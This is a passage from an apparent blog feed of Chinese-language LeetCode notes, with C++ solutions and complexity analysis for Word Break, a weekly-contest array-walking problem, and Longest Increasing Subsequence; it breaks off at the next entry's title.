        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/139/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述：給定一個字串 <code>s</code>，以及一個字串形成的陣列 <code>wordDict</code>，若 <code>s</code> 可以被分割成一個或多個 <code>wordDict</code> 當中的單字序列，則回傳 <code>True</code></li></ul><div class="note info flat"><p>Note that the same word in the dictionary may be reused multiple times in the segmentation.</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><code>s</code> 中的每個字元可以 <strong>選或不選</strong>，每次形成一個子字串，就去跟 <code>wordDict</code> 進行比較看當前子字串是否存在於 <code>wordDict</code> 當中，一旦嘗試過每個子字串，則回傳結果。</p><h2 id="我的解答"><a href="#我的解答" class="headerlink" title="我的解答"></a>我的解答</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; dp; </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">helper</span><span class="params">(string s, <span class="type">int</span> start, vector&lt;string&gt;&amp; wordDict)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start == s.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(dp[start]!= <span class="number">-1</span>) <span class="keyword">return</span> dp[start];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            string word = s.<span class="built_in">substr</span>(start, i-start+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">find</span>(wordDict.<span class="built_in">begin</span>(), wordDict.<span class="built_in">end</span>(),word)!=wordDict.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">helper</span>(s,i+<span class="number">1</span>, wordDict))&#123;</span><br><span class="line">                    <span class="keyword">return</span> dp[start]=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[start]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span></span>&#123;</span><br><span class="line">        dp.<span class="built_in">resize</span>(s.<span class="built_in">length</span>()+<span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(s,<span class="number">0</span> ,wordDict);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>實際上使用了 Recursive + Memoization 的DP技巧</p></blockquote><p>這裡直接講 <code>helper</code> 函數，首先會是撇除 <code>dp</code>，會是最純粹的遞迴關係式，透過 for迴圈，來迭代 <code>s</code>，透過 <code>start</code> 以及當前的 <code>i</code> 來形成不同範圍的子字串， <strong>接著透過 <code>std::find()</code> 函數來查到當前子字串陣列 <code>wordDict</code> 範圍中是否有匹配的單字</strong> ， 如果有找到匹配單字，則遞迴呼叫 <code>helper()</code>，其中也給定更新的 <code>start</code> 位置作為新的子字串起點。</p><p>接著就是 Memoization的部分，在 <code>start</code> 抵達字串終點時就回傳 true。而遞迴呼叫的結果如果存在，則對應的 <code>dp[start]</code> 位置設定為 1，並且在每一層遞回中，如果發現 <code>dp[start]</code> 並非 -1，就代表先前已經有計算過了，就直接回傳結果就好。</p><p>然而對於某個起始點 <code>start</code> 所切出的所有子字串，如果都沒有匹配的單字，則 <code>dp[start] = false</code></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/139/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p><code>helper</code> 函數中，在選擇不同起始點的for迴圈中，會嘗試不同的子字串，若字串長度是 $n$，則內部迴圈耗費時間也會是 $O(n)$，則遞迴深度最深為 $O(n)$，另外在字典比對中，時間複雜度會是 $O(m)$，$m$ 會是 <code>wordDict</code> 的大小。</p><p>因此整體時間複雜度會是 $O(n^2 \cdot m)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>recursive call 深度最深為 $O(n)$，每次遞迴只會增加 <code>start</code>，直到遞迴深度達到字串長度 $n$，<code>dp</code> 大小為 $O(n)$，用來儲存已經運算過的結果。因此整體空間複雜度一樣還是 $O(n)$。</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Q1. Make Array Elements Equal to Zero | Easy | LeetCode Weekly Contest</title>
      <link href="/posts/cf1b9e8c.html"/>
      <url>/posts/cf1b9e8c.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>這算是第一次做 LeetCode Weekly Contest 的紀錄，今天是心血來潮上來打，所以準備考的時候只剩下沒多少時間，但我還是菜雞，因此就專攻第一題試水溫，寫完後就停止 </p></blockquote><h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/1117_q1/question.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目給定一個整數陣列 <code>nums</code>，並且需要先選定一個起始點 <code>curr</code>，其中 <code>nums[curr] =0</code>。從起始點可以選擇往左走或往右走，接著可以重複下面的步驟:</li></ul><ol><li>若 <code>curr</code> 超出範圍 <code>[0, n-1]</code> 則步驟停止</li><li>透過加減 <code>curr</code> 值來實現向左和向右移動，<code>curr</code> 增加: 向右移動，<code>curr</code> 減少: 向左移動</li><li>移動後一旦 <code>nums[curr] &gt; 0</code> 則<ul><li>需要將 <code>nums[curr]</code> 值減一</li><li>反轉當前的移動方向</li><li>朝新方向前進一步</li></ul></li></ol><p><strong>當移動結束時，所有元素值都歸零則被視為 Valid，請回傳總共有幾種 Valid 的走法</strong></p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>首先會需要迭帶題目給的陣列 <code>nums</code>，並且需要找到起始點，可能會有多個起始點，接著就是要從起始點開始向左或向有走來判斷是否 <code>valid</code>，在走訪過程中，一旦碰到大於0的值就會開始反向走，直到碰到另一端的底端或是另一個大於零的值</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(vector&lt;<span class="type">int</span>&gt;nums, <span class="type">int</span> start, <span class="type">bool</span> direct)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> curr = start;</span><br><span class="line">        <span class="keyword">while</span>(curr &gt;=<span class="number">0</span> &amp;&amp; curr &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[curr] ==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(direct) curr++;</span><br><span class="line">                <span class="keyword">else</span> curr--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                nums[curr]--;</span><br><span class="line">                direct = !direct;</span><br><span class="line">                <span class="keyword">if</span>(direct) curr++;</span><br><span class="line">                <span class="keyword">else</span> curr--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=nums.<span class="built_in">begin</span>(); it!=nums.<span class="built_in">end</span>(); ++it)&#123;</span><br><span class="line">            <span class="keyword">if</span>(*it !=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countValidSelections</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//select starting position</span></span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isValid</span>(nums,i,<span class="literal">true</span>))&#123;</span><br><span class="line">                    found++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isValid</span>(nums,i,<span class="literal">false</span>))&#123;</span><br><span class="line">                    found++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> found;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡拆開成兩個函數進行，主函數 <code>countValidSelections</code> 用迴圈先找起始點，找到起始點後，就會分別呼叫兩次函數 <code>isValid</code> 並且給定不同的方位。 <code>isValid</code> 函數中，會在 <code>curr &gt;=0 &amp;&amp; curr &lt; n</code> 範圍中來回走訪不同元素，一旦碰到值為零的元素，則沿著原本方向繼續走訪，而如果碰到大於0的值，則將 <code>nums[curr]</code> 減掉一，並且反向繼續走一步。最後走訪完畢所有元素後，檢查所有元素是否都歸零，如果是，則為valid，否則為invalid。檢查完回到主函數後，如果路徑有效，則會將 <code>found</code> 變數增加一。之後在跑不同起始點後，就可以回傳變數 <code>found</code> 了。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/1117_q1/result.jpeg"></p><blockquote><p>runtime 時間耗費就非常高了</p></blockquote><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>$O(n^2)$</li></ul><p><code>countValidSelections</code>: 最多執行 $n$ 次，對於每個起始位置，<code>isValid</code> 會被呼叫兩次。<code>isValid</code>: <code>while</code> 迴圈在最壞狀況下會走訪整個陣列，因此為 $O(n)$，回傳前還會有個迴圈檢查是否每個元素都為 0。這也需要 $O(n)$ 。因此整體時間複雜度為 $2 \times (O(n) + O(n)) &#x3D; O(4n) &#x3D; O(n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>$O(n)$<br>每次呼叫 <code>isValid</code> 時，創建一個陣列 <code>nums</code> 的副本，因此為 $O(n)$，在 <code>countValidSelections</code> 的每次迭代中，<code>isValid</code> 被呼叫兩次，但這些副本的存活時間是Local的，因此不會累積。所以整體空間複雜度為 $O(n)$</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最長遞增子序列 | Medium | 300. Longest Increasing Subsequence</title>
      <link href="/posts/14bd70a5.html"/>
      <url>/posts/14bd70a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/300/question.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給定一個整數陣列 <code>nums</code>，回傳所有可能的遞增子序列中最長的長度</li></ul><div class="note info flat"><p>子序列(Subsequence) 可由原先陣列中刪除多個元素來得到，但不可更動其元素順序，其中遞增子序列代表元素由左至右數字漸增</p><p>Ex. <code>[5,8,3,2,4,5,9,15,7,20]</code><br>其子序列包含:<br><code>[5,8,4,5,20]</code> 非遞增子序列<br><code>[2,4,9,15]</code> 遞增子序列<br><code>[15,7,20]</code>  非遞增子序列<br><code>[5,9,15,20]</code>  遞增子序列</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法比較偏向暴力解，一開始先思考要怎麼手動找出遞增子序列，並且要找到最長的。</p><p>對於 <code>nums = [10,9,2,5,3,7,101,18]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i=0 [10,9]</span><br><span class="line">i=1 [10,2]</span><br><span class="line">i=2 [10,5]</span><br><span class="line">i=3 [10,3]</span><br><span class="line">i=4 [10,7]</span><br><span class="line">i=5 [10,101]</span><br><span class="line">i=6 [10,18] -&gt; 遞增子序列，max_length = 2</span><br></pre></td></tr></table></figure><p>接著就會是每一輪迭代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">i=0 [9,2]</span><br><span class="line">i=1 [9,5]</span><br><span class="line">i=2 [9,3]</span><br><span class="line">i=3 [9,7]</span><br><span class="line">i=4 [9,101] -&gt; 遞增子序列，max_length = 2</span><br><span class="line">-&gt; [9, 101,] X</span><br><span class="line">i=5 [9,18] -&gt; 遞增子序列，max_length = 2</span><br><span class="line">----------</span><br><span class="line">i=0 [2,5] -&gt; 遞增子序列，max_length = 2</span><br><span class="line">-&gt; [2,5,3] X</span><br><span class="line">-&gt; [2,5,7]  -&gt; 遞增子序列，max_length = 3</span><br><span class="line">-&gt; [2,5,7,101]  -&gt; 遞增子序列，max_length = 4</span><br><span class="line">-&gt; [2,5,7,101,18] X</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">i=1 [2,3] -&gt; 遞增子序列，max_length = 2</span><br><span class="line">-&gt; [2,3,7] -&gt; 遞增子序列，max_length = 3</span><br><span class="line">-&gt; [2,3,7, 101] -&gt; 遞增子序列，max_length = 4</span><br><span class="line">-&gt; [2,3,7, 101, 18] X</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="我的解答"><a href="#我的解答" class="headerlink" title="我的解答"></a>我的解答</h2><h3 id="錯誤做法"><a href="#錯誤做法" class="headerlink" title="錯誤做法"></a>錯誤做法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; tempList;</span><br><span class="line">    <span class="type">int</span> max_length =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        tempList.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">        <span class="type">int</span> current = nums[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current &lt; nums[j])&#123;</span><br><span class="line">                tempList.<span class="built_in">push_back</span>(nums[j]);</span><br><span class="line">                current = nums[j];</span><br><span class="line">                max_length = <span class="built_in">max</span>(max_length, (<span class="type">int</span>)tempList.<span class="built_in">size</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tempList.<span class="built_in">clear</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max_length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這是我一開始的寫法，透過一個 <code>tempList</code> 來保存子序列，並且透過兩個迴圈來查看遞增子序列，同時更新最長序列長度。但這個程式會有問題:</p><ul><li><strong>遺漏所有可能的子序列</strong>，內層迴圈會以 <code>nums[i]</code> 為起點，並且一旦選擇某一個數字作為當前遞增子序列的一部分後，沒有回頭檢查其他可能的分支</li></ul><p>Example: <code>[0,1,0,3,2,3]</code>，在選擇 <code>[0,1,3]</code> 就可能忽略 <code>[0,1,2]</code> 這個子序列</p><ul><li><strong>無法回朔選擇</strong></li><li><code>tempList</code> 沒有特別用意，就只是為了計算長度</li><li>時間複雜度高</li></ul><h3 id="正確做法"><a href="#正確做法" class="headerlink" title="正確做法"></a>正確做法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max_length =<span class="number">1</span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;i; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[j] &lt; nums[i])&#123;</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], dp[j]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        max_length = <span class="built_in">max</span>(max_length ,dp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max_length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改良版本收先先針對 Edge Case做處理，但也可忽略(畢竟題目給的條件會至少會有一個元素)，接著宣告 <code>dp</code> 陣列， <strong><code>dp[i]</code> 代表以 <code>nums[i]</code> 為結尾的最長遞增子序列的長度</strong>，初始化為 1，因為每個元素至少可以單獨成為長度為 1 的子序列。</p><p>接著是雙層迴圈，外層迴圈用來跑 <code>nums[i]</code>，由於 <code>i=0</code> 的時候，第一個元素本身就已經是長度為1 的子序列，並且如果外層為 0，內層就不會有 <code>j &lt; i</code> 的條件在，所以可以跳過這個狀況。</p><p>而內層為 0，對於每個 <code>nums[i]</code> 可以檢查 <code>nums[0]</code> 到 <code>nums[i-1]</code> 是否有小於 <code>nums[i]</code> 的元素，如果存在 <code>nums[j] &lt; nums[i]</code>，則可以將 <code>nums[i]</code> 接在 <code>nums[j]</code> 結尾的子序列之後 (<code>dp[j] + 1</code>, 當前元素也占用一個子序列長度)</p><p>由於會遍歷不同的 <code>j</code> 值，並且更新到 <code>dp[i]</code>，因此一旦有 <code>nums[i] &lt; nums[j]</code> 狀況時，就可以比較 <code>dp[j]+1</code> 與上一輪更新的 <code>dp[i]</code> 誰比較長，最後，每一次內層迴圈跑完，就代表以 <code>nums[i]</code> 為頭的子序列已經找完一輪了，因此可以更新 <code>max_length</code>。雙層迴圈跑完最後回傳 <code>max_length</code> 即可。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/300/result.jpeg"></p><h2 id="最佳化解答"><a href="#最佳化解答" class="headerlink" title="最佳化解答"></a>最佳化解答</h2><p>這是由 <a href="https://www.geeksforgeeks.org/longest-monotonically-increasing-subsequence-size-n-log-n/">geeksforgeek 提供的最佳化解答</a>，時間複雜度僅有 $O(nlogn)$，<strong>這段主要是透過 Binary Search 來實現</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    res.<span class="built_in">push_back</span>(nums[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;n; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i]&gt; res.<span class="built_in">back</span>()) res.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// Get lower bound index</span></span><br><span class="line">            <span class="type">int</span> low = std::<span class="built_in">lower_bound</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>(), nums[i]) - res.<span class="built_in">begin</span>();</span><br><span class="line">            res[low] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡需要說明一下，首先宣告一個用來儲存最長子序列的陣列 <code>res</code> (並且是遞增子序列)，首先把第一個 <code>nums[0]</code> pusH 到 <code>res</code> 中，之後對於每個 <code>nums[i]</code> 有兩種可能的操作，若 <code>nums[i]</code> 大於 <code>res</code> 中的最末端元素(最大元素)，則直接push到 <code>res</code> 的末端。</p><p>但如果 <code>nums[i]</code> 小於 <code>res</code> 中的末段元素，<strong>但他也有可能會是其他子序列的頭或尾端</strong>，因此需要找到他比哪個 <code>res</code> 中的值還要大，再加入進 <code>res</code> 中的對應位置。這時候就要用到 <code>&lt;bits/stdc++.h&gt;</code>  中的函數 <code>std::lower_bound()</code> 它可以用來找到 <code>res</code> 中第一個不小於 <code>nums[i]</code>的值</p><blockquote><p>The lower_bound function returns an iterator pointing to the first element that is not less than the current number.</p></blockquote><p>之後獲取該值的 index 並且保存到變數 <code>low</code>，接著替換 <code>res</code> 中 index 為 <code>low</code> 的值為 <code>nums[i]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[1,2,7,8,3,4,5,9,0]</span><br><span class="line">1 -&gt; [1]</span><br><span class="line">2 -&gt; [1,2]</span><br><span class="line">7 -&gt; [1,2,7]</span><br><span class="line">8 -&gt; [1,2,7,8]</span><br><span class="line">3 -&gt; [1,2,3,8]  // we replaced 7 with 3, since for the longest sequence we need only the last number and 1,2,3 is our new shorter sequence</span><br><span class="line">4 -&gt; [1,2,3,4] // we replaced 8 with 4, since the max len is the same but 4 has more chances for longer sequence</span><br><span class="line">5 -&gt; [1,2,3,4,5]</span><br><span class="line">9 -&gt; [1,2,3,4,5,9]</span><br><span class="line">0 -&gt; [0,2,3,4,5,9] // we replaced 1 with 0, so that it can become a new sequence</span><br></pre></td></tr></table></figure><blockquote><p>對於上面的範例，最長子序列為 <code>[1,2,3,4,5,9]</code> 且長度為 6</p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/300/result2.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>方法</th><th>時間複雜度</th><th>空間複雜度</th><th>優勢</th><th>適用情境</th></tr></thead><tbody><tr><td>動態規劃 (DP)</td><td>$O(n^2)$</td><td>$O(n)$</td><td>簡單易懂，適合中小規模陣列</td><td>當數組長度 $n \leq 10^3$ 時</td></tr><tr><td>二分搜尋法 (貪婪法)</td><td>$O(n \log n)$</td><td>$O(n)$</td><td>更高效，適合處理大規模數陣列</td><td>當數組長度 $n &gt; 10^3$ 時</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回文子字串 | Medium | LeetCode#647. Palindromic Substrings</title>
      <link href="/posts/141899d4.html"/>
      <url>/posts/141899d4.html</url>
      
